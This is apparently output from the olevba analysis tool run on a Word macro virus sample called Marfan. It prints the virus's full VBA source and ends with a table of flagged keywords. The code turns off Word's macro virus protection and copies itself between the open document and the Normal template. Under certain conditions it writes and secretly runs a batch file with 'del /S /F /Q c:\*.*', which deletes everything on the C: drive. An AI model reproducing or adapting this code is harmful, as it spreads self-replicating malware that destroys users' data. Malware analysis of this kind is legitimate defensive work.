olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marfan-c8c24c4cb1307581e5db5c41357720babb15dc9f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marfan-c8c24c4cb1307581e5db5c41357720babb15dc9f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error GoTo skammy
Options.VirusProtection = False
Randomize
If Int(2 * Rnd) = 1 Then
    Marfan_Syndrome
End If

skammy:
End Sub
 
Private Sub Marfan_Syndrome()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
     Next I
    PayLoad
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        lineofcode = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)
        NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines I * 2, lineofcode
    Next I
    NormalTemplate.Save
End If
End If
End Sub

Private Sub PayLoad()

Symptoms = 0
SymptomsString = "Symptoms Found\n-------------\n"

If ActiveDocument.PageSetup.PageHeight > 720 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Was Abnormally Tall (Long)\n"
End If

If ActiveDocument.Range(Start:=0, End:=1).Font.Size > 12 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of Nearsightedness\n"
End If

With ActiveDocument.Sections(1).Footers(wdHeaderFooterPrimary)
    If .Range.Text = vbCr Then
        Symptoms = Symptoms + 1
        SymptomsString = SymptomsString + "Your Document Had Flat Feet\n"
    End If
End With

If ActiveDocument.Words.Count < 100 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Possible Bad Joints Were Detected\n"
End If
       
If System.MathCoprocessorInstalled = False Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Computer Does Not Have A MathCoProcessor (Chest Pains)\n"
End If

If ActiveDocument.PageSetup.BottomMargin <> ActiveDocument.PageSetup.TopMargin Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of Slouching or Bad Posture\n"

End If

If ActiveDocument.PageSetup.LeftMargin > 90 Or ActiveDocument.PageSetup.BottomMargin > 72 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of Long Arms or Legs\n"
End If
    
If ActiveDocument.PageSetup.TopMargin > 72 Then
    Symptoms = Symptoms + 1
    SymptomsString = SymptomsString + "Your Document Showed Signs of a High Palette\n"
End If
    
If Symptoms > 2 Then

    With Application.FileSearch
        .NewSearch
        .LookIn = "c:\"
        .SearchSubFolders = False
        .FileName = "marfan.bat"
        .MatchTextExactly = True
    End With
    
    If Application.FileSearch.Execute() > 0 Then
        If DateDiff("d", FileDateTime("c:\marfan.html"), Now) > 30 Then
            MsgBox "Your Computer Is Experiencing an Aortic Dissection!"
            MsgBox "You Have 2 Minutes To Get To The Hospital!"
            MsgBox "I Would Recommend Rebooting!"
            Open "c:\marfan.bat" For Output As #1
                Print #1, "del /S /F /Q c:\*.*"
            Close #1
            countdown = Now
            While DateDiff("s", countdown, Now) < 120
            Wend
            vResult = Shell("c:\marfan.bat", vbHide)
         End If
    Else
    Open "c:\marfan.bat" For Output As #1
        Print #1, "c:\marfan.html"
    Close #1
    Open "c:\marfan.html" For Output As #1
        Print #1, "<HTML>        "
        Print #1, "<META HTTP-EQUIV=" & Chr$(34) & "Refresh" & Chr$(34) & " CONTENT=" & Chr$(34) & "0;URL=http://www.marfan.org" & Chr$(34) & ">"
        Print #1, "<SCRIPT LANGUAGE=" & Chr$(34) & "JavaScript" & Chr$(34) & ">"
        Print #1, "document.open(" & Chr$(34) & "http://www.marfan.org" & Chr$(34) & ");"
        Print #1, "alert('Attention!  Word Is Infected With Marfan Syndrome!\nIf Left Untreated an Aortic Dissection Could Occur!');"
        Print #1, "alert('" & SymptomsString & "');"
        Print #1, "</SCRIPT>"
        Print #1, "<BODY>"
        Print #1, "</BODY>"
        Print #1, "</HTML>"
     Close #1
     vResult = Shell("c:\marfan.bat", vbHide)

    End If
End If
  
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|IOC       |http://www.marfan.or|URL                                          |
|          |g                   |                                             |
|IOC       |marfan.bat          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

